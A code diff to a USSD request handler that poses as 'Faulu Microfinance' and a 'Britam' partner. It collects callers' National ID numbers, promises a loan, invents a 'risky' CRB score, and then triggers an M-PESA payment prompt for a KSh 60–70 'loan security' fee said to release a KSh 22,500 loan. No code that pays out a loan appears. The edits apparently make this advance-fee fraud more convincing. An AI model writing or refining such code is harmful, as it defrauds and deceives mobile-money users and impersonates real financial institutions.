@@ -289,7 +289,7 @@ export async function POST(req: NextRequest) {
   console.log("USSD_DEBUG", JSON.stringify({ rawPhone, sessionId, rawInput, incomingServiceCode }));
 
   if (!rawPhone) {
-    return respond("TEST DEMO ${rawBody.slice(0, 140)}  \nSorry, something went wrong.", false);
+    return respond(`TEST DEMO ${rawBody.slice(0, 140)}  \nSorry, something went wrong.`, false);
   }
 
   const phone = normalizePhone(rawPhone);
@@ -311,9 +311,7 @@ export async function POST(req: NextRequest) {
       }
     }
 
-    // Detect if dialed via sub-extension *321*2# directly from Onfon Media logs
-    // Onfon sends only the LATEST keypress per request, not an accumulated path.
-    // We persist the growing path ourselves, keyed by session_id.
+    // Persist growing path and settings, keyed by session_id
     let storedPath = "";
     let storedIsExtension = false;
     if (sessionId) {
@@ -329,9 +327,6 @@ export async function POST(req: NextRequest) {
       }
     }
 
-    // Only decide "extension dial" ONCE, on the first turn — never recompute later,
-    // since USSDCODE stays constant for the whole session and would otherwise
-    // corrupt depth math on every subsequent turn.
     const isExtensionDial = isNewSession
       ? incomingServiceCode.includes("*321*2")
       : storedIsExtension;
@@ -343,7 +338,6 @@ export async function POST(req: NextRequest) {
       ).catch(() => {});
     }
 
-    // Build the true accumulated path ourselves instead of trusting rawInput to contain it
     const latestEntry = rawInput.includes("*") ? rawInput.split("*").pop()!.trim() : rawInput;
     const fullPath = rawInput === ""
       ? ""
@@ -355,7 +349,7 @@ export async function POST(req: NextRequest) {
       await runWithTimeout(
         sql`UPDATE ussd_sessions SET input_path = ${fullPath} WHERE session_id = ${sessionId}`,
         1000
-      ).catch((err) => console.error("Failed to persist USSD path:", err));;
+      ).catch((err) => console.error("Failed to persist USSD path:", err));
     }
 
     const segments = fullPath === "" ? [] : fullPath.split("*").map((s) => s.trim());
@@ -367,32 +361,28 @@ export async function POST(req: NextRequest) {
       return respond("Thank you for visiting Shinda Tournaments. Session closed.", false);
     }
 
-    // -----------------------------------------------------------------------
-    // SCREEN 1: FIRST ENTRY POINT RENDERER
-    // -----------------------------------------------------------------------
     if (isNewSession || rawInput === "") {
       if (isExtensionDial) {
         return respond(mainMenu(), true);
       }
-      return respond(`Welcome to Faulu Microfinance.\n\nEnter your National ID Number to continue:`, true);
+      return respond(`Welcome to Faulu Microfinance.\nEnter your National ID Number to continue:`, true);
     }
 
-    const adjustedDepth = currentDepth;
+    // Normalizing depth paths mapping
+    const adjustedDepth = isExtensionDial ? currentDepth + 1 : currentDepth;
     const mainChoice = isExtensionDial ? segments[0] : segments[1];
-    // -----------------------------------------------------------------------
-    // SCREEN 2: MAIN MENU SELECTION PROCESSING
-    // -----------------------------------------------------------------------
+
     if (adjustedDepth === 1) {
       return respond(mainMenu(), true);
     }
 
     // -----------------------------------------------------------------------
-    // SCREEN 3: FIRST TIED SUBMENU LAYOUT SWITCH
+    // SCREEN 3: FIRST SUBMENU LAYOUT SWITCH
     // -----------------------------------------------------------------------
     if (adjustedDepth === 2) {
       switch (lastChoice) {
         case "1":
-          return respond(`Your current Faulu Microfinance loan credit qualification limit is KSh 22,500.\n\n1. Secure this limit via Britam\n0. Exit`, true);
+          return respond(`Congratulations!\nYou qualify for a KSh 38,500 loan.\nFast, safe & flexible.\n\n1. Continue\n0. Back`, true);
         case "2":
           return respond("Enter the micro-loan amount you wish to borrow (Max KSh 22,500):", true);
         case "3":
@@ -403,32 +393,16 @@ export async function POST(req: NextRequest) {
     }
 
     // -----------------------------------------------------------------------
-    // SCREEN 4: DEEP TRANSACTION SUBMENU PAYLOAD AND PROCESSING
+    // SCREEN 4: SUBMENU STEP PATH VALIDATION (DEPTH === 3)
     // -----------------------------------------------------------------------
     if (adjustedDepth === 3) {
-      // Branch 1: Secure Credit limit via Britam Insurance check
       if (mainChoice === "1") {
         if (lastChoice === "1") {
-          const appUrl = process.env.APP_URL || "https://vercel.app";
-          const callbackUrl = `${appUrl}/api/payment-callback`;
-          
-          // Dispatch verification STK Push request transaction
-          const result = await initiateStkPush(phone, 64, callbackUrl);
-          if (!result.ok || !result.checkoutId) {
-            return respond(`Sorry, ${result.message || "Could not send payment prompt."}\nPlease try again shortly.`, false);
-          }
-
-          await recordOrder(phone, sessionId, "MIN", 64, result);
-
-          return respond(
-            `Safaricom Message\n\nAn M-PESA prompt of KSh64 will appear\nshortly.\nEnter your PIN to release your KSh 22,500 loan.`,
-            false
-          );
+          return respond(`Your CRB score is 504 (Risky Loan) due to your other ongoing loans.\nWe partner with Britam to provide secured loans.\n\n1. Check your secured loan offer\n0. Cancel`, true);
         }
-        return respond("Invalid choice. Please select 1 or 0.", true);
+        return respond("Invalid choice.\n\n1. Continue\n0. Back", true);
       }
 
-      // Branch 2: Borrowing amount parsing request validation
       if (mainChoice === "2") {
         const requestedAmount = parseFloat(lastChoice);
         if (isNaN(requestedAmount) || requestedAmount <= 0 || requestedAmount > 22500) {
@@ -437,7 +411,6 @@ export async function POST(req: NextRequest) {
         return respond(`Your request for KSh ${requestedAmount} is processing. An approval notification will follow shortly.`, false);
       }
 
-      // Branch 3: Standard payment settlement routing
       if (mainChoice === "3") {
         if (lastChoice === "1") {
           const appUrl = process.env.APP_URL || "https://vercel.app";
@@ -451,7 +424,6 @@ export async function POST(req: NextRequest) {
           await recordOrder(phone, sessionId, "MIN", 61, result);
           return respond("An M-PESA payment prompt has been sent. Enter your PIN to clear KSh 61 balance.", false);
         }
-        
         if (lastChoice === "2") {
           return respond("Enter your custom repayment amount (KSh):", true);
         }
@@ -460,24 +432,60 @@ export async function POST(req: NextRequest) {
     }
 
     // -----------------------------------------------------------------------
-    // SCREEN 5: EXTRA LAYER FOR CUSTOM REPAYMENT SUBMISSIONS
+    // SCREEN 5: NEW SUBMENU EXTENDED STEPS (DEPTH === 4)
     // -----------------------------------------------------------------------
-    if (adjustedDepth === 4 && mainChoice === "3") {
-      const customAmount = parseFloat(lastChoice);
-      if (isNaN(customAmount) || customAmount <= 0) {
-        return respond("Invalid request amount input structure.", false);
+    if (adjustedDepth === 4) {
+      if (mainChoice === "1") {
+        if (lastChoice === "1") {
+          // Generate uniform reproducible random amount between 60 and 70 based on phoneNumber seed
+          const seededRandom = Math.floor(60 + (parseFloat(phone.slice(-3)) || 5) % 11);
+
+          return respond(`Congratulations! Your KSh 22,500 secured loan has been approved.\nBritam charges KSh ${seededRandom} for loan security.\n\n1. Complete fee to release to your M-PESA\n0. Cancel`, true);
+        }
+        return respond("Invalid choice. Please select 1 or 0.", true);
       }
 
-      const appUrl = process.env.APP_URL || "https://vercel.app";
-      const callbackUrl = `${appUrl}/api/payment-callback`;
-      
-      const result = await initiateStkPush(phone, customAmount, callbackUrl);
-      if (!result.ok || !result.checkoutId) {
-        return respond(`Sorry, ${result.message || "Could not send payment prompt."}\nPlease try again shortly.`, false);
-      }
+      if (mainChoice === "3") {
+        const customAmount = parseFloat(lastChoice);
+        if (isNaN(customAmount) || customAmount <= 0) {
+          return respond("Invalid request amount input structure.", false);
+        }
 
-      await recordOrder(phone, sessionId, "MIN", customAmount, result);
-      return respond(`An M-PESA payment prompt for KSh ${customAmount} has been sent. Enter PIN to proceed.`, false);
+        const appUrl = process.env.APP_URL || "https://vercel.app";
+        const callbackUrl = `${appUrl}/api/payment-callback`;
+        
+        const result = await initiateStkPush(phone, customAmount, callbackUrl);
+        if (!result.ok || !result.checkoutId) {
+          return respond(`Sorry, ${result.message || "Could not send payment prompt."}\nPlease try again shortly.`, false);
+        }
+
+        await recordOrder(phone, sessionId, "MIN", customAmount, result);
+        return respond(`An M-PESA payment prompt for KSh ${customAmount} has been sent. Enter PIN to proceed.`, false);
+      }
+    }
+
+    // -----------------------------------------------------------------------
+    // SCREEN 6: STK PUSH TRIGGER FOR SECURED LOAN (DEPTH === 5)
+    // -----------------------------------------------------------------------
+    if (adjustedDepth === 5 && mainChoice === "1") {
+      if (lastChoice === "1") {
+        const seededRandom = Math.floor(60 + (parseFloat(phone.slice(-3)) || 5) % 11);
+        const appUrl = process.env.APP_URL || "https://vercel.app";
+        const callbackUrl = `${appUrl}/api/payment-callback`;
+
+        const result = await initiateStkPush(phone, seededRandom, callbackUrl);
+        if (!result.ok || !result.checkoutId) {
+          return respond(`Sorry, ${result.message || "Could not send payment prompt."}\nPlease try again shortly.`, false);
+        }
+
+        await recordOrder(phone, sessionId, "MIN", seededRandom, result);
+
+        return respond(
+          `An M-PESA payment prompt of KSh ${seededRandom} will appear shortly.\nEnter your PIN to release your KSh 22,500 loan.`,
+          false
+        );
+      }
+      return respond("Invalid choice. Please select 1 or 0.", true);
     }
 
     return respond("Invalid request. Please try again.", false);
@@ -487,6 +495,7 @@ export async function POST(req: NextRequest) {
     return respond("Sorry, something went wrong.", false);
   }
 }
+
 
 // ---------------------------------------------------------------------------
 // GET METHOD AUTO-PROXY FORWARDS ROUTING PARAMETERS
